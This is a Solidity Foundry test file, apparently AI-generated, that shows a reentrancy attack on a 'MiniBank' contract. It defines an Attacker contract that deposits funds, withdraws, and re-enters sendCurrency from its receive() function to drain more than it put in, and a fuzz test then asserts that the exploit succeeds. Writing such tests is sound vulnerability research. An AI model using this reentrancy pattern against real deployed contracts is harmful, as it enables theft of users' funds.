// Generation Time: 23,77s
// Input Tokens: 2711
// Output Tokens: 688
// Reasoning Tokens: 3283


// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "../lib/forge-std/src/Test.sol";
import {MiniBank} from "../src/MiniBank.sol";

contract TestReentrancyMiniBank is Test {
    MiniBank public _contractUnderTest;
    Attacker public _attacker;

    function setUp() public {
        _contractUnderTest = new MiniBank();
        _attacker = new Attacker(address(_contractUnderTest));
    }

    function test_attackerCallsMultipleTimes(uint256 attackVal) public {
        vm.assume(attackVal > 0 && attackVal < type(uint128).max / 4);

        // Fund the victim so it can pay out more than the attacker's deposit.
        vm.deal(address(_contractUnderTest), attackVal * 2);

        // Fund the attacker and the test contract.
        vm.deal(address(_attacker), attackVal * 2);
        vm.deal(address(this), attackVal * 2);

        // Setup: attacker deposits into the victim via receiveCurrency.
        _attacker.setupAttack{value: attackVal}(attackVal);

        // Execute the attack.
        _attacker.attack(attackVal);

        // Assert that reentrancy occurred and drained more than a single withdrawal.
        assertTrue(
            _attacker.exploitSucceeded(),
            "Reentrancy attack failed: exploitSucceeded flag was not set."
        );
    }

    // Allow this test contract to receive ETH if needed during execution.
    receive() external payable {}
}

contract Attacker {
    MiniBank public _victim;

    uint256 public reentrancyCount;
    bool public exploitSucceeded;

    uint256 public storedAttackVal;
    uint256 public initialVictimBalance;

    constructor(address victimAddress) {
        _victim = MiniBank(victimAddress);
    }

    function setupAttack(uint256 val) public payable {
        reentrancyCount = 0;
        exploitSucceeded = false;
        storedAttackVal = val;

        // Deposit into the victim so that our balance in MiniBank is 'val'.
        _victim.receiveCurrency{value: val}();

        // Record the victim's balance after deposit and external funding.
        initialVictimBalance = address(_victim).balance;
    }

    function attack(uint256 val) public {
        require(val == storedAttackVal, "val mismatch");

        // Initiate the vulnerable withdrawal.
        _victim.sendCurrency();

        // After the call completes, check how much the victim has left.
        uint256 finalVictimBalance = address(_victim).balance;
        uint256 expectedSingleWithdrawBalance = initialVictimBalance - storedAttackVal;

        // If we re-entered and drained more than a single withdrawal amount,
        // the final balance will be strictly less than expectedSingleWithdrawBalance.
        if (reentrancyCount > 1 && finalVictimBalance < expectedSingleWithdrawBalance) {
            exploitSucceeded = true;
        }
    }

    receive() external payable {
        reentrancyCount++;

        // Perform one controlled re-entrancy into the vulnerable function.
        if (reentrancyCount < 2) {
            _victim.sendCurrency();
        }
    }
}
